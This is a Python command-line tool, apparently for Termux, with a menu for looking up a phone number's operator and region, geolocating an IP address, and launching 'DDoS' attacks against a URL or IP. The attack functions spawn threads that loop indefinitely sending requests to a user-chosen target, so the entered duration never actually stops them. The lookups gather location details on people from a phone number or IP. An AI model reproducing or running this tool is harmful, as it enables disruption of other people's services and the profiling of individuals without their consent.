import requests
import threading
import time

def search_phone(phone_number):
    url = f"http://num.voxlink.ru/get/?num={phone_number}"
    response = requests.get(url)
    data = response.json()
    return data

def search_ip(ip):
    url = f"http://ipwho.is/{ip}"
    response = requests.get(url)
    data = response.json()
    return data

def ddos_ip(ip, number_of_threads, duration):
    def attack():
        while True:
            try:
                response = requests.get(f"http://{ip}")
                print(f"Request sent to {ip}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()

def ddos_attack(url, number_of_threads, duration):
    def attack():
        while True:
            try:
                response = requests.get(url)
                print(f"Request sent to {url}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()

def main():
    print('''
  ██████  ██▓     ▄▄▄       ▄████▄   ██ ▄█▀
▒██    ▒ ▓██▒    ▒████▄    ▒██▀ ▀█   ██▄█▒ 
░ ▓██▄   ▒██░    ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
  ▒   ██▒▒██░    ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
▒██████▒▒░██████▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
▒ ▒▓▒ ▒ ░░ ▒░▓  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
░ ░▒  ░ ░░ ░ ▒  ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ 
░  ░  ░    ░ ░     ░   ▒   ░        ░ ░░ ░ 
      ░      ░  ░      ░  ░░ ░      ░  ░   
                           ░    
                           
Version 1.0 By: @TermuXSoftwares

''')
    while True:
        print('''
┌─ [Search]      ┌─ [Attack]         ┌─ [Menu]
├─ [1] Phone     ├─ [3] DDoS         └─ [5] Exit
└─ [2] IP        └─ [4] DDoS IP      
''')
        choice = input('''
┌───(User@Slack)─[~/Slack/Menu-1]
└──$:''')
        if choice == "1":
            phone_number = input("Enter a phone number (+79999999999): ")
            result = search_phone(phone_number)
            print(f"Number: {phone_number}")
            print(f"Operator: {result['operator']}")
            print(f"Region: {result['region']}")
        elif choice == "2":
            ip = input("Enter an IP address: ")
            result = search_ip(ip)
            print(f"IP: {result['ip']}")
            print(f"Continent: {result['continent']}")
            print(f"Country: {result['country']}")
            print(f"Region: {result['region']}")
            print(f"City: {result['city']}")
            print(f"Timezone: {result['timezone']}")
            print(f"Latitude: {result['latitude']}")
            print(f"Longitude: {result['longitude']}")
        elif choice == "3":
            url = input("Enter the URL to attack: ")
            number_of_threads = int(input("Enter the number of threads: "))
            duration = int(input("Enter the duration of the attack (in seconds): "))
            ddos_attack(url, number_of_threads, duration)
        elif choice == "4":
            ip = input("Enter the IP address to attack: ")
            number_of_threads = int(input("Enter the number of threads: "))
            duration = int(input("Enter the duration of the attack (in seconds): "))
            ddos_ip(ip, number_of_threads, duration)
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()